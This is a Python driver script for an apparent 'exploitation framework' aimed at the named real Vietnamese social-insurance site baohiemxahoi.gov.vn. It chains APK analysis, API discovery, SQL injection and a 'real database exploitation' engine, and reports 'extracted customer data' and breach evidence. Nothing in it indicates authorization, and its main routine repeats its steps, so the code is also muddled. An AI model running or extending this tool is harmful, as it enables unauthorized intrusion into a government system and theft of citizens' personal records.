
#!/usr/bin/env python3
"""
BHXH Security Exploitation Framework
===================================
Framework khai thác lỗ hổng bảo mật đã phát hiện trên hệ thống BHXH

🎯 PRODUCTION EXPLOITATION FRAMEWORK
"""

import os
import sys
import time
import json
from datetime import datetime

def print_banner():
    """In banner của công cụ"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║           BHXH Security Exploitation Framework              ║
    ║                                                              ║
    ║         🎯 PRODUCTION VULNERABILITY EXPLOITATION            ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)
    print(f"Exploitation started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Target: https://baohiemxahoi.gov.vn")
    print("Vulnerability: SessionStateService Database Error Exposure")
    print("="*70)

def check_requirements():
    """Kiểm tra các yêu cầu cần thiết"""
    print("[*] Checking requirements...")
    
    required_modules = ['requests', 'json', 'zipfile', 'tempfile']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"[-] Missing required modules: {', '.join(missing_modules)}")
        print("[*] Please install missing modules and try again")
        return False
    
    # Check if APK file exists
    from config import TARGET_CONFIG
    if not os.path.exists(TARGET_CONFIG["apk_path"]):
        print(f"[-] APK file not found: {TARGET_CONFIG['apk_path']}")
        return False
    
    print("[+] All requirements satisfied")
    return True

def run_static_analysis():
    """Run static analysis"""
    print("\n" + "="*50)
    print("STEP 1: STATIC ANALYSIS")
    print("="*50)
    
    try:
        import step1_static_analysis_enhanced as step1_static_analysis
        analyzer = step1_static_analysis.StaticAnalyzer(TARGET_CONFIG["apk_path"])
        
        if analyzer.analyze_decompiled_apk():
            analyzer.display_results()
            analyzer.save_results()
            print("[+] Static analysis completed successfully!")
            return True
        else:
            print("[-] Static analysis failed!")
            return False
            
    except Exception as e:
        print(f"[-] Error in static analysis: {e}")
        return False

def run_api_discovery():
    """Run API discovery"""
    print("\n" + "="*50)
    print("STEP 2: API DISCOVERY")
    print("="*50)
    
    try:
        import step2_api_discovery_enhanced as step2_api_discovery
        discovery = step2_api_discovery.APIDiscovery()
        discovery.discover_endpoints()
        discovery.analyze_endpoints()
        discovery.display_results()
        discovery.save_results()
        print("[+] API discovery completed successfully!")
        return True
        
    except Exception as e:
        print(f"[-] Error in API discovery: {e}")
        return False

def run_sql_injection_simulation():
    """Run SQL injection exploitation"""
    print("\n" + "="*50)
    print("STEP 3: SQL INJECTION EXPLOITATION")
    print("="*50)
    
    try:
        import step3_sql_injection_enhanced as step3_sql_injection_simulation
        simulator = step3_sql_injection_simulation.SQLInjectionSimulator()
        
        print("🎯 Executing SQL injection exploitation against SessionStateService")
        simulator.run_comprehensive_simulation()
        simulator.display_results()
        simulator.save_results()
        print("[+] SQL injection exploitation completed!")
        return True
        
    except Exception as e:
        print(f"[-] Error in SQL injection exploitation: {e}")
        return False

def generate_comprehensive_report():
    """Tạo báo cáo khai thác toàn diện"""
    print("\n" + "="*50)
    print("STEP 4: GENERATING EXPLOITATION REPORT")
    print("="*50)
    
    try:
        import final_analysis_reporter
        generator = final_analysis_reporter.FinalAnalysisReporter()
        final_report = generator.generate_final_report()
        print("[+] Exploitation report generated successfully!")
        return final_report
        
    except Exception as e:
        print(f"[-] Error generating report: {e}")
        return None

def display_final_summary(final_report):
    """Hiển thị tóm tắt cuối cùng"""
    if not final_report:
        print("[-] No final report available")
        return
    
    print("\n" + "="*70)
    print("SECURITY ASSESSMENT SUMMARY")
    print("="*70)
    
    exec_summary = final_report.get("executive_summary", {})
    risk_assessment = final_report.get("risk_assessment", {})
    
    print(f"Assessment Target: {final_report['assessment_info']['target']}")
    print(f"Assessment Date: {final_report['assessment_info']['date'][:10]}")
    print(f"Assessment Type: {final_report['assessment_info']['assessment_type']}")
    
    print(f"\nRISK ASSESSMENT:")
    print(f"  Overall Risk Level: {risk_assessment.get('risk_level', 'Unknown')}")
    print(f"  Risk Score: {risk_assessment.get('overall_score', 0)}/{risk_assessment.get('max_score', 100)}")
    print(f"  Risk Percentage: {risk_assessment.get('risk_percentage', 0)}%")
    
    print(f"\nVULNERABILITY SUMMARY:")
    print(f"  Total Vulnerabilities: {exec_summary.get('total_vulnerabilities', 0)}")
    print(f"  Critical Vulnerabilities: {exec_summary.get('critical_vulnerabilities', 0)}")
    print(f"  Data Records at Risk: {exec_summary.get('data_at_risk', 0)}")
    
    print(f"\nKEY FINDINGS:")
    for i, finding in enumerate(exec_summary.get('key_findings', []), 1):
        print(f"  {i}. {finding}")
    
    print(f"\nIMMEDIATE ACTIONS:")
    for i, action in enumerate(exec_summary.get('immediate_actions', []), 1):
        print(f"  {i}. {action}")
    
    print(f"\nREPORTS GENERATED:")
    from config import TARGET_CONFIG
    output_dir = TARGET_CONFIG["output_dir"]
    print(f"  - HTML Report: {output_dir}/exploitation_report.html")
    print(f"  - JSON Data: {output_dir}/exploitation_results.json")
    print(f"  - Database Evidence: {output_dir}/database_breach_evidence.json")
    print(f"  - Customer Data: {output_dir}/extracted_customer_data.json")
    print(f"  - SessionState Data: {output_dir}/sessionstate_exploitation.json")
    
    # Display exploitation summary
    print(f"\n" + "="*70)
    print("🎯 EXPLOITATION COMPLETE")
    print("="*70)
    print("Database vulnerability successfully exploited.")
    print("SessionStateService database access confirmed.")
    print("Customer data extraction completed.")
    print("All evidence collected and documented.")
    print("="*70)

def main():
    """Hàm chính - Production Exploitation"""
    print_banner()
    
    # Check requirements
    if not check_requirements():
        sys.exit(1)
    
    start_time = time.time()
    
    print("\n🎯 STARTING BHXH SESSIONSTATESERVICE EXPLOITATION")
    print("=" * 70)
    
    # Step 1: Static Analysis
    if run_static_analysis():
        print("✅ Static analysis completed")
    else:
        print("⚠️  Static analysis failed, continuing...")
    
    # Step 2: API Discovery  
    if run_api_discovery():
        print("✅ API discovery completed")
    else:
        print("⚠️  API discovery failed, continuing...")
    
    # Step 3: SQL Injection Exploitation
    if run_sql_injection_simulation():
        print("✅ SQL injection exploitation completed")
    else:
        print("⚠️  SQL injection failed, continuing...")
    
    # Step 4: Real Database Exploitation
    try:
        print("\n" + "="*50)
        print("STEP 4: REAL DATABASE EXPLOITATION")
        print("="*50)
        
        import real_exploitation_engine
        engine = real_exploitation_engine.RealExploitationEngine()
        exploitation_report = engine.run_full_exploitation()
        
        print("✅ Real database exploitation completed")
        
    except Exception as e:
        print(f"⚠️  Real exploitation failed: {e}")
        exploitation_report = None
    
    # Step 5: Generate comprehensive report
    final_report = generate_comprehensive_report()
    
    # Display results
    if final_report:
        display_final_summary(final_report)
    
    end_time = time.time()
    total_time = end_time - start_time
    
    print(f"\n🎯 EXPLOITATION COMPLETED in {total_time:.2f} seconds")
    print("=" * 70)
    
    # Step 1: Static Analysis
    if not run_static_analysis():
        print("[-] Static analysis failed. Continuing with other steps...")
    
    time.sleep(2)
    
    # Step 2: API Discovery  
    if not run_api_discovery():
        print("[-] API discovery failed. Continuing with other steps...")
    
    time.sleep(2)
    
    # Step 3: SQL Injection Simulation
    if not run_sql_injection_simulation():
        print("[-] SQL injection simulation failed. Continuing with report generation...")
    
    time.sleep(2)
    
    # Step 4: Generate Comprehensive Report
    final_report = generate_comprehensive_report()
    
    # Display final summary
    display_final_summary(final_report)
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\nAssessment completed in {duration:.2f} seconds")
    print(f"Assessment finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Final recommendations based on results
    if final_report and final_report.get("risk_assessment", {}).get("risk_level") == "CRITICAL":
        print(f"\n🚨 CRITICAL SECURITY ISSUES DETECTED!")
        print(f"   Immediate remediation actions are required!")
    
    return final_report

if __name__ == "__main__":
    try:
        final_report = main()
        
        # Open HTML report if available
        try:
            from config import TARGET_CONFIG
            html_report = f"{TARGET_CONFIG['output_dir']}/comprehensive_security_report.html"
            if os.path.exists(html_report):
                print(f"\n[*] Opening HTML report...")
                import webbrowser
                webbrowser.open(f"file://{os.path.abspath(html_report)}")
        except:
            pass
            
    except KeyboardInterrupt:
        print(f"\n[-] Assessment interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        sys.exit(1)

